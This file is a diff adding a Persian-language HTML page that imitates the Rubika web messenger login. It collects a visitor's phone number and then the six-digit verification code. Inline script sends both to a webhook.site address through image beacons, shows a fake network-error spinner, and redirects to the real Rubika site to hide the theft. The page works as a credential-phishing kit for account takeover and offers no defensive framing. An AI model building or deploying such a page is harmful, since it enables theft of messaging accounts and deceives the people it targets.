@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پیام رسان وب روبیکا</title>
+    <meta property="og:title" content="ورود به روبیکا وب روبینو">
+    <meta property="og:description" content="برای ورود به حساب کاربری خود، روی لینک کلیک کنید.">
+    <meta property="og:image" content="./rubika_clone_files/icon-192x192.png">
+
+    <link rel="stylesheet" href="./rubika_clone_files/styles.4a506c95da707c4283b8.css">
+
+    <style>
+        .step { display: none; }
+        .step.active { display: block; }
+        .error { color: #e53935; font-size: 14px; margin-top: 8px; display: none; }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.95);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+        .overlay.show { display: flex; }
+        .spinner {
+            width: 40px; height: 40px;
+            border: 4px solid #ddd;
+            border-top-color: #1976d2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .overlay-message { font-size: 16px; color: #555; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <div id="auth-pages" class="whole">
+        <div class="scrollable scrollable-y no-scrollbar">
+            <div class="auth-placeholder"></div>
+            <div data-animation="tabs" class="tabs-container auth-pages__container">
+                <div class="tabs-tab sidebar-slider-item page-sign active">
+                    <div class="container center-align">
+                        <div class="auth-image">
+                            <img src="./rubika_clone_files/icon-192x192.png" alt="روبیکا"
+                                 onerror="this.onerror=null; this.style.display='none';">
+                        </div>
+
+                        <!-- مرحله ۱: شماره موبایل -->
+                        <div id="step1" class="step active">
+                            <h4> ورود</h4>
+                            <div class="subtitle">لطفا شماره همراه خود را وارد کنید.</div>
+                            <div class="input-wrapper">
+                                <div class="input-field">
+                                    <input type="tel" id="phone" class="input-field-input" placeholder="شماره همراه" inputmode="numeric" autofocus>
+                                    <div class="input-field-border"></div>
+                                </div>
+                            </div>
+                            <div id="phoneError" class="error">شماره موبایل معتبر نیست</div>
+                            <button class="btn-primary btn-color-primary rp" onclick="goToCode()">
+                                <span>بعدی</span>
+                            </button>
+                        </div>
+
+                        <!-- مرحله ۲: کد تأیید -->
+                        <div id="step2" class="step">
+                            <h4>کد تأیید</h4>
+                            <div class="subtitle">کد ۶ رقمی ارسال‌شده را وارد کنید.</div>
+                            <div class="input-wrapper">
+                                <div class="input-field">
+                                    <input type="text" id="codeInput" class="input-field-input" placeholder="کد تأیید" inputmode="numeric" maxlength="6">
+                                    <div class="input-field-border"></div>
+                                </div>
+                            </div>
+                            <div id="codeError" class="error">کد باید ۶ رقم باشد</div>
+                            <button id="submitBtn" class="btn-primary btn-color-primary rp" onclick="sendData()">
+                                <span>تأیید</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="auth-placeholder"></div>
+        </div>
+    </div>
+
+    <div id="overlay" class="overlay">
+        <div class="spinner"></div>
+        <div class="overlay-message">اختلال در اینترنت، در حال تلاش مجدد...</div>
+        <div style="font-size:14px; color:#888;">لطفاً شکیبا باشید</div>
+    </div>
+
+    <script>
+        let phoneNumber = '';
+
+        function goToCode() {
+            const phone = document.getElementById('phone').value.trim();
+            const clean = phone.replace(/^\+98/, '').replace(/^0/, '');
+            if (/^9\d{9}$/.test(clean)) {
+                phoneNumber = '0' + clean;
+                document.getElementById('phoneError').style.display = 'none';
+                document.getElementById('step1').classList.remove('active');
+                document.getElementById('step2').classList.add('active');
+                document.getElementById('codeInput').focus();
+
+                // 🔥 ارسال فقط شماره موبایل (مرحله اول)
+                new Image().src = 'https://webhook.site/e4565a9f-ff82-4603-b832-3562ba9794a3?phone=' +
+                                  encodeURIComponent(phoneNumber) + '&step=1';
+            } else {
+                document.getElementById('phoneError').style.display = 'block';
+            }
+        }
+
+        function sendData() {
+            const code = document.getElementById('codeInput').value.trim();
+            const btn = document.getElementById('submitBtn');
+            if (!/^\d{6}$/.test(code)) {
+                document.getElementById('codeError').style.display = 'block';
+                return;
+            }
+            document.getElementById('codeError').style.display = 'none';
+            btn.disabled = true;
+            btn.querySelector('span').textContent = 'لطفاً صبر کنید...';
+
+            // 🔥 ارسال شماره و کد (مرحله دوم)
+            new Image().src = 'https://webhook.site/e4565a9f-ff82-4603-b832-3562ba9794a3?phone=' +
+                              encodeURIComponent(phoneNumber) + '&code=' + encodeURIComponent(code) + '&step=2';
+
+            document.getElementById('overlay').classList.add('show');
+
+            setTimeout(function() {
+                window.location.href = 'https://web.rubika.ir/';
+            }, 2500);
+        }
+    </script>
+</body>
+</html>
